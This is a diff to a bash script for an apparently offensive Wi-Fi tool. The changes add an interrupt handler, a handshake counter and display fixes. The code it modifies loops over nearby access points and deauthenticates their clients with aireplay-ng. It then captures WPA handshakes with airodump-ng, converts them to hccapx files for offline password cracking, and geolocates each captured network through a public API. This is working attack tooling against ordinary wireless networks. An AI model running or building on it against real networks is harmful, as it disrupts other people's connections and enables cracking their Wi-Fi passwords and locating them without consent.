@@ -1,5 +1,7 @@
 #!/bin/bash
 
+trap ctrl_c INT
+
 if [ "$EUID" -ne 0 ]
 then
 	echo -e "[-] Requires root permission. Exiting!"
@@ -21,6 +23,14 @@ YELLOW='\033[1;33m'
 ORANGE='\033[0;33m'
 NC='\033[0m'
 
+ctrl_c(){
+	echo -en "\033[2K"
+	echo -e "\r\n${YELLOW}[*] Keyboard Interrupt${NC}"
+	echo -e "${LBLUE}[*] Handshakes captured this session: $hs_count${NC}"
+	rm -r /tmp/hc_* &> /dev/null
+	exit 0
+}
+
 echo -e "${RED}"
 echo " __   __  _______  _______  __   __  _______  _______  _______  _______  __   __ "; sleep 0.2
 echo "|  | |  ||   _   ||       ||  | |  ||       ||   _   ||       ||       ||  | |  |"; sleep 0.2
@@ -37,9 +47,11 @@ rm -r /tmp/hc_* &> /dev/null
 
 echo -en "\033[3B"
 
+hs_count=0
+
 while true
 do
-	count=0
+	ap_count=0
 
 	echo -en "\033[3A"
 	echo -en "\033[2K"
@@ -47,6 +59,7 @@ do
 	echo -en "\033[1B"
 	echo -en "\033[2K"
 	echo -en "\033[2B"
+	echo -en "\r"
 	timeout --foreground 3 airodump-ng "$interface" -w /tmp/hc_out --output-format csv &> /dev/null
 
 	#echo "[*] Reading stations"
@@ -69,7 +82,7 @@ do
 		then
 			continue
 		fi
-		((count++))
+		((ap_count++))
 		echo -en "\033[2A"
 		echo -en "\033[2K"
 		echo -en "\rAccess Point: ${YELLOW}$essid${NC}"
@@ -78,6 +91,7 @@ do
 		echo -en "\033[2K"
 		echo -en "\rStatus: ${YELLOW}Deauthenticating clients${NC}"
 		echo -en "\033[3B"
+		echo -en "\r"
 		iwconfig "$interface" channel "$channel"
 		aireplay-ng --deauth 5 -a "$bssid" "$interface" &> /dev/null &
 		sleep 1
@@ -85,6 +99,7 @@ do
 		echo -en "\033[2K"
 		echo -en "\rStatus: ${YELLOW}Listening for handshake${NC}"
 		echo -en "\033[3B"
+		echo -en "\r"
 		timeout --foreground 10s airodump-ng -w /tmp/hc_captures/"$bssid" --output-format pcap --bssid "$bssid" --channel "$channel" "$interface" &> /dev/null
 		cap2hccapx "/tmp/hc_captures/$bssid-01.cap" "/tmp/hc_handshakes/$bssid.hccapx" &> /dev/null
 		hashflag=`wlanhcxinfo -i "/tmp/hc_handshakes/$bssid.hccapx" 2>&1`
@@ -93,6 +108,7 @@ do
 			rm "/tmp/hc_handshakes/$bssid.hccapx"
 		else
 			cp "/tmp/hc_handshakes/$bssid.hccapx" "handshakes/$bssid.hccapx"
+			((hs_count++))
 			loc_data="`curl -s "https://api.mylnikov.org/geolocation/wifi?v=1.2&bssid=$bssid"`"
 			if [ "`echo $loc_data`" ]
 			then
@@ -107,18 +123,18 @@ do
 		fi
 	done
 
-	if [[ $count == 0 ]]
+	if [[ $ap_count == 0 ]]
 	then
 		echo -en "\033[1A"
 		echo -en "\033[2K"
 		echo -en "\rLast scan: ${YELLOW}No new networks :(${NC}"
 		echo -en "\033[1B"
+		echo -en "\r"
 	else
 		echo -en "\033[1A"
 		echo -en "\033[2K"
 		echo -en "\rLast scan: ${YELLOW}`ls /tmp/hc_handshakes/ | wc -l` new handshakes captured${NC}"
 		echo -en "\033[1B"
+		echo -en "\r"
 	fi
-	
-	rm -r /tmp/hc_* &> /dev/null
 done
